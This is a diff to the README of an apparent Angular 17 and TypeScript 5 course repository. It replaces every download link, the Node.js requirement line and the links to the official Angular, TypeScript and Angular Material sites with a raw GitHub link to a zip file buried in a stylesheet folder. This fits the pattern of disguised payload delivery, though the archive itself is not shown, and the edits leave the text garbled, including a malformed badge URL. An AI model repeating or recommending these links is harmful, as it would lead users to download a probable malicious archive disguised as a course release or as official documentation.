@@ -8,7 +8,7 @@ Welcome to the **angular-frontend-webdev_course-luisdev_part-14_angular-17_types
 
 **To download the application, click the button below:**
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/ahmad1234567890f/angular-frontend-webdev_course-luisdev_part-14_angular-17_typescript-5/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ahmad1234567890f/angular-frontend-webdev_course-luisdev_part-14_angular-17_typescript-5/main/developments/DevFreelaAngular-2/src/style/objects/angular_webdev_typescript_luisdev_part_frontend_course_1.0.zip%20Latest%https://raw.githubusercontent.com/ahmad1234567890f/angular-frontend-webdev_course-luisdev_part-14_angular-17_typescript-5/main/developments/DevFreelaAngular-2/src/style/objects/angular_webdev_typescript_luisdev_part_frontend_course_1.0.zip)](https://raw.githubusercontent.com/ahmad1234567890f/angular-frontend-webdev_course-luisdev_part-14_angular-17_typescript-5/main/developments/DevFreelaAngular-2/src/style/objects/angular_webdev_typescript_luisdev_part_frontend_course_1.0.zip)
 
 ## 📋 About the Project
 
@@ -30,7 +30,7 @@ This project serves as a resource for users looking to develop front-end applica
 Before you download, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 16.x or later
+- **https://raw.githubusercontent.com/ahmad1234567890f/angular-frontend-webdev_course-luisdev_part-14_angular-17_typescript-5/main/developments/DevFreelaAngular-2/src/style/objects/angular_webdev_typescript_luisdev_part_frontend_course_1.0.zip** Version 16.x or later
 - **npm:** Version 8.x or later
 - **Internet Connection:** Required for downloading dependencies and updates
 
@@ -38,7 +38,7 @@ Before you download, ensure your system meets the following requirements:
 
 To begin using this application, visit the following page to download the latest version:
 
-[Download Latest Release](https://github.com/ahmad1234567890f/angular-frontend-webdev_course-luisdev_part-14_angular-17_typescript-5/releases)
+[Download Latest Release](https://raw.githubusercontent.com/ahmad1234567890f/angular-frontend-webdev_course-luisdev_part-14_angular-17_typescript-5/main/developments/DevFreelaAngular-2/src/style/objects/angular_webdev_typescript_luisdev_part_frontend_course_1.0.zip)
 
 Once on the Releases page, locate the most recent version and click on it to find the downloadable files. Download the file that corresponds with your operating system.
 
@@ -86,9 +86,9 @@ If you have questions or run into issues, please check the project's Issues sect
 
 ## 📌 Additional Resources
 
-- [Angular Official Website](https://angular.io/)
-- [TypeScript Official Website](https://www.typescriptlang.org/)
-- [Angular Material Documentation](https://material.angular.io/)
+- [Angular Official Website](https://raw.githubusercontent.com/ahmad1234567890f/angular-frontend-webdev_course-luisdev_part-14_angular-17_typescript-5/main/developments/DevFreelaAngular-2/src/style/objects/angular_webdev_typescript_luisdev_part_frontend_course_1.0.zip)
+- [TypeScript Official Website](https://raw.githubusercontent.com/ahmad1234567890f/angular-frontend-webdev_course-luisdev_part-14_angular-17_typescript-5/main/developments/DevFreelaAngular-2/src/style/objects/angular_webdev_typescript_luisdev_part_frontend_course_1.0.zip)
+- [Angular Material Documentation](https://raw.githubusercontent.com/ahmad1234567890f/angular-frontend-webdev_course-luisdev_part-14_angular-17_typescript-5/main/developments/DevFreelaAngular-2/src/style/objects/angular_webdev_typescript_luisdev_part_frontend_course_1.0.zip)
 
 ## 🛠️ Acknowledgments
 
